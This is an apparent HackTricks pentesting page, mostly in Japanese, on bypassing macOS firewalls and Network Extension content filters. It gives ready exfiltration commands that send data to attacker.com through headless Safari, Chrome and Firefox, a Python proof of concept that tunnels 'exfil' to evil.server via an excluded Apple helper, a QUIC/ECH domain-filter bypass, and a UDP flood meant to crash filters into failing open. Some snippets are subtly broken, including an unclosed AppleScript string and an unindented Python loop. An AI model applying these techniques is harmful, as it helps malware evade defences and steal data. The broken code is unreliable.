# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## 見つかった手法

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

- 例えば、よく知られた macOS プロセスの名前（例: **`launchd`**）で malware を実行する

### Synthetic Click

- ファイアウォールがユーザーに権限を求める場合、malware に **「Allow」をクリックさせる**

### **Use Apple signed binaries**

- 例: **`curl`** や **`whois`** など

### Well known apple domains

ファイアウォールが **`apple.com`** や **`icloud.com`** のようなよく知られた apple ドメインへの接続を許可している可能性があります。iCloud は C2 として利用されることがあります。

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

許可されているトラフィックを把握することで、潜在的に whitelisted domains やどのアプリケーションがそれらにアクセスできるかを特定するのに役立ちます。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

DNS の解決は、署名されたアプリケーション **`mdnsreponder`** によって行われ、DNS サーバーへ接続することが許可されている可能性が高い。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ブラウザアプリ経由

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

任意のサーバーに接続できるプロセスに**inject code into a process**ことができれば、ファイアウォールの保護を回避できます：

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024年7月、AppleはSafari/WebKitの重大なバグを修正しました。このバグはScreen Timeで使用されるシステム全体の「Web content filter」に影響を与えていました。
特別に細工されたURI（例えば、二重にURLエンコードされた「://」など）はScreen TimeのACLによって認識されませんが、WebKitでは受け入れられるため、リクエストはフィルタされずに送信されます。そのため、URLを開くことができる任意のプロセス（sandboxedやunsigned codeを含む）は、ユーザーやMDM profileによって明示的にブロックされているドメインに到達できます。

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### macOS 14 “Sonoma” 初期の Packet Filter (PF) ルール順序バグ
macOS 14 のベータサイクル中、Apple は **`pfctl`** の userspace ラッパーにリグレッションを導入しました。
`quick` キーワードで追加されたルール（多くの VPN kill-switches が使用）はサイレントに無視され、VPN/firewall GUI が *blocked* と報告していてもトラフィック leaks を引き起こしました。複数の VPN ベンダーによってこのバグが確認され、RC 2 (build 23A344) で修正されました。

簡易 leak チェック:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple署名済みヘルパーサービスの悪用（レガシー – pre-macOS 11.2）
macOS 11.2 以前では、**`ContentFilterExclusionList`** により **`nsurlsessiond`** や App Store など約50の Apple バイナリが Network Extension フレームワークで実装されたソケットフィルタファイアウォール（LuLu、Little Snitch 等）をすべてバイパスできました。
マルウェアは除外されたプロセスを単に起動する、あるいはそのプロセスにコードを注入して、既に許可されたソケット経由で自身のトラフィックをトンネルすることができました。Apple は macOS 11.2 で除外リストを完全に削除しましたが、アップグレードできないシステムではこの手法は依然として有効です。

proof-of-concept の例（pre-11.2）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH を使って Network Extension のドメインフィルタを回避する (macOS 12+)
NEFilter Packet/Data Providers は TLS ClientHello の SNI/ALPN を基に動作します。**HTTP/3 over QUIC (UDP/443)** と **Encrypted Client Hello (ECH)** を使うと、SNI は暗号化されたままになり、NetExt はフローを解析できず、ホスト名ルールはしばしば fail-open になり、malware が DNS を経由せずにブロックされたドメインへ到達します。

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH がまだ有効な場合、これは簡単なホスト名フィルター回避経路になります。

### macOS 15 “Sequoia” Network Extension の不安定性 (2024–2025)
初期の 15.0/15.1 ビルドではサードパーティの **Network Extension** フィルタ（LuLu、Little Snitch、Defender、SentinelOne など）がクラッシュします。フィルタが再起動すると macOS はフロー規則を破棄し、多くの製品が fail‑open になります。フィルタを数千の短い UDP フローでフラッディングする（または QUIC/ECH を強制する）と、クラッシュが繰り返し発生し、GUI がファイアウォールが稼働中であると表示している間に C2/exfil の窓が残ることがあります。

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## モダンな macOS 向けのツール用ヒント

1. GUI ファイアウォールが生成する現在の PF ルールを確認する:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに *outgoing-network* entitlement を持つバイナリを列挙する（piggy-backing に有用）:
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. プログラムから自分の Network Extension content filter を Objective-C/Swift で登録する。
パケットをローカルソケットに転送する最小限の rootless PoC は Patrick Wardle の **LuLu** ソースコードで入手可能です。

## 参考

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
